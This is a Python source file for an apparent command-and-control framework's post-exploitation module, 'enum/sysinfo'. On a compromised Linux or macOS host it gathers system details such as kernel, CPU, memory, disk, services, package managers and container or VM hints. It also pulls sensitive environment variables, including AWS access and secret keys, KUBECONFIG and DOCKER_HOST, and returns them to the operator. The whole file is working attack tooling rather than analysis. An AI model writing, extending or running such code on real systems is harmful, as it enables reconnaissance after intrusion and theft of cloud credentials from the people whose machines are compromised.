"""Extended system information enumeration.

Expands on the basic sysinfo task type built into the C2 to include:
kernel version, CPU/RAM, installed package managers, running services,
environment variables, disk usage, and container/VM detection hints.

Platform: Linux, macOS (darwin).
"""

from __future__ import annotations

import os
import platform
import socket
import subprocess

from post.base import ModuleResult, PostModule
from post.loader import register


def _run(cmd: str, timeout: int = 10) -> str:
    """Run a shell command; return stdout+stderr stripped, never raise."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return (r.stdout + r.stderr).strip()
    except Exception as exc:  # noqa: BLE001
        return f"[error: {exc}]"


@register
class SysinfoModule(PostModule):
    NAME = "enum/sysinfo"
    DESCRIPTION = "Extended system info: kernel, CPU, RAM, packages, services, container hints"
    PLATFORM = ["linux", "darwin"]

    def run(self, args: dict | None = None) -> ModuleResult:
        data: dict = {}
        lines: list[str] = []

        # ── Basic identity ────────────────────────────────────────────────────
        hostname = socket.getfqdn()
        uname = platform.uname()
        data["hostname"] = hostname
        data["os"] = uname.system
        data["os_release"] = uname.release
        data["os_version"] = uname.version
        data["machine"] = uname.machine
        data["python"] = platform.python_version()
        lines += [
            f"Hostname  : {hostname}",
            f"OS        : {uname.system} {uname.release}",
            f"Kernel    : {uname.version}",
            f"Arch      : {uname.machine}",
        ]

        # ── CPU & memory ──────────────────────────────────────────────────────
        cpu_info = _run("lscpu 2>/dev/null || sysctl -n machdep.cpu.brand_string 2>/dev/null")
        mem_info = _run("free -h 2>/dev/null || vm_stat 2>/dev/null | head -5")
        data["cpu_info"] = cpu_info
        data["mem_info"] = mem_info
        lines += [f"CPU       :\n{cpu_info}", f"Memory    :\n{mem_info}"]

        # ── Disk ──────────────────────────────────────────────────────────────
        disk = _run("df -h 2>/dev/null")
        data["disk"] = disk
        lines.append(f"Disk      :\n{disk}")

        # ── Environment ───────────────────────────────────────────────────────
        env = dict(os.environ)
        interesting_keys = {
            "PATH", "HOME", "USER", "LOGNAME", "SHELL", "LANG",
            "LD_PRELOAD", "LD_LIBRARY_PATH", "PYTHONPATH",
            "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
            "DOCKER_HOST", "KUBECONFIG",
        }
        filtered_env = {k: v for k, v in env.items() if k in interesting_keys}
        data["env"] = filtered_env
        lines.append("Env (interesting):")
        for k, v in sorted(filtered_env.items()):
            lines.append(f"  {k}={v}")

        # ── Package managers present ──────────────────────────────────────────
        pkg_mgrs = {}
        for mgr in ("dpkg", "rpm", "pacman", "brew", "pip3", "npm", "gem", "cargo"):
            out = _run(f"which {mgr} 2>/dev/null")
            if out and not out.startswith("[error"):
                pkg_mgrs[mgr] = out
        data["package_managers"] = pkg_mgrs
        lines.append(f"Package mgrs: {list(pkg_mgrs.keys())}")

        # ── Installed package count ───────────────────────────────────────────
        pkg_count = (
            _run("dpkg --list 2>/dev/null | wc -l")
            or _run("rpm -qa 2>/dev/null | wc -l")
            or _run("brew list 2>/dev/null | wc -l")
        )
        data["installed_package_count"] = pkg_count.strip()

        # ── Running services ──────────────────────────────────────────────────
        services = _run(
            "systemctl list-units --type=service --state=running --no-pager 2>/dev/null"
            " || launchctl list 2>/dev/null | grep -v '\\-$'"
        )
        data["running_services"] = services
        lines.append(f"Services  :\n{services}")

        # ── Container / VM detection ──────────────────────────────────────────
        container_hints: list[str] = []
        if os.path.exists("/.dockerenv"):
            container_hints.append("Docker (.dockerenv present)")
        cgroup = _run("cat /proc/1/cgroup 2>/dev/null | head -3")
        if "docker" in cgroup or "lxc" in cgroup or "kubepods" in cgroup:
            container_hints.append(f"Container cgroup: {cgroup}")
        if os.path.exists("/run/systemd/container"):
            container_hints.append("systemd container")
        virt = _run("systemd-detect-virt 2>/dev/null || hostnamectl 2>/dev/null | grep Virtualization")
        if virt and "none" not in virt.lower() and not virt.startswith("[error"):
            container_hints.append(f"Virtualisation: {virt}")
        data["container_vm_hints"] = container_hints
        if container_hints:
            lines.append(f"Container/VM: {container_hints}")

        return ModuleResult(ok=True, output="\n".join(lines), data=data)
